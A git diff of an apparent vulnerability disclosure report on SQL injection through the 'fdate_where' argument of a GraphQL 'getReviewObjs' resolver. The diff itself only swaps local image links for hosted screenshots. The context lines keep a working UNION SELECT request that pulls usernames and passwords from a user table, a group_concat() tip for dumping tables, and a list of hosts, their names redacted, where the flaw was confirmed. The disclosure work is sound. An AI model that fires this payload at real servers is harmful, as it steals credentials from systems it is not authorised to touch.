@@ -58,7 +58,7 @@ table alias and is equally injectable:
 if (fdate_where_str) select_s.whereRaw("a." + fdate_where_str);
 ```
 
-![image-20261123202302279](./本地图片.assets/image-20261123202302279.png)
+
 <img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/26c829b2-9ab3-4c70-80de-c9fa96b7a713" />
 
 
@@ -106,7 +106,7 @@ The schema declares it as `[String]`. There is no format check, no length
 limit and no date validation; the only processing is duplicating the value when
 the array has one element (line 1757).
 
-![image-20261123203741266](./本地图片.assets/image-20261123203741266.png)
+
 <img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/371c1f26-fcbc-48df-98c4-8116b0d75663" />
 
 
@@ -154,7 +154,7 @@ Content-Type: application/json
 {"query":"{getReviewObjs(frptid:\"1\",fusername:\"admin\",fstate:5,fdefsql:\"\",fdate_where:[\"x') AND 1=0 UNION SELECT username,userpassword,'1',1 FROM t_user -- \",\"2020-01-02\"],fissubmit:1,fmore_where:\"\",pageSize:20,fisSingleBatch:true)}","ftoken":"<token>","ftokenswarm":""}
 ```
 
-![image-20261117140643564](./本地图片.assets/image-20261117140643564.png)
+
 <img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/046b898e-7ad9-4f45-9305-17e97ba81011" />
 
 
@@ -170,11 +170,11 @@ The resolver returns a URL-encoded JSON document. After decoding:
 Only two columns are reflected (`fid`, `fcreateuser`), so reading whole tables
 requires `group_concat()` with a delimiter.
 
-![image-20261117140908669](./本地图片.assets/image-20261117140908669.png)
+
 <img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/e17fd5c7-201d-4421-b30d-fe2e34d3d0e9" />
 
 
-![image-20261117140851000](./本地图片.assets/image-20261117140851000.png)
+
 <img width="2547" height="1137" alt="image" src="https://github.com/user-attachments/assets/252ea94d-f3ab-4915-a1d3-131129fb9dca" />
 
 
@@ -198,46 +198,46 @@ SQL Server and MySQL.
 
 SQLite — `xmjl.<redacted>:8080`:
 
-![image-20261119211546020](./本地图片.assets/image-20261119211546020.png)
+
 <img width="2019" height="1359" alt="image" src="https://github.com/user-attachments/assets/ef28f615-959c-4b35-a529-286cb5941d8f" />
 
 
 
 SQLite — `sxjxfsbapi.<redacted>:8080`:
 
-![image-20261119211758434](./本地图片.assets/image-20261119211758434.png)
+
 <img width="2025" height="1371" alt="image" src="https://github.com/user-attachments/assets/c3710bc3-9f93-42d3-8acf-8e1292c22fb5" />
 
 
 SQL Server — `mainapitest.<redacted>:8808`:
 
-![image-20261119215254566](./本地图片.assets/image-20261119215254566.png)
+
 <img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/7c8f9f14-8d2c-4de5-9539-ccc32bf204c6" />
 
 
-![image-20261119215304730](./本地图片.assets/image-20261119215304730.png)
+
 <img width="1347" height="1182" alt="image" src="https://github.com/user-attachments/assets/311211e5-dace-4ace-8f61-c96034a659e0" />
 
 
 
 MySQL — `help.<redacted>:8180`:
 
-![image-20261119215549859](./本地图片.assets/image-20261119215549859.png)
+
 <img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/e0ab6019-047e-45b1-bd1a-0d06bb39cbde" />
 
 
-![image-20261119222915030](./本地图片.assets/image-20261119222915030.png)
+
 <img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/e0a99ce9-ba3b-416b-8ca7-74f130e584c9" />
 
 
 MySQL — `ds100.<redacted>:8180`:
 
-![image-20261119222605919](./本地图片.assets/image-20261119222605919.png)
+
 <img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/2a069b6a-201c-4737-b512-de396c63517d" />
 
 
 
-![image-20261119222955901](./本地图片.assets/image-20261119222955901.png)
+
 <img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/1fb94400-3b3f-4aab-846f-16ff25712c27" />
 
 
